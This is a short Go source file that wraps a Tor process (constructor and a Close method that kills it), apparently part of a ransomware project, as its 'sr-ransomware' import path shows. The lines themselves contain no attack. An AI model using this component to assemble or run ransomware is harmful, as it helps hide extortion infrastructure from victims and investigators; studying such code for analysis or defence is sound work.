package exe

import (
    "os"
    "os/exec"

    "github.com/sug0/sr-ransomware/go/errors"
)

type Tor struct {
    cmd    *exec.Cmd
    path   string
    config string
}

func NewTor(path, config string) *Tor {
    return &Tor{path: path, config: config}
}

func (t *Tor) Close() error {
    if t.cmd != nil {
        t.cmd.Process.Signal(os.Kill)
        return errors.WrapIfNotNil(pkg, "error on tor wait", t.cmd.Wait())
    }
    return nil
}
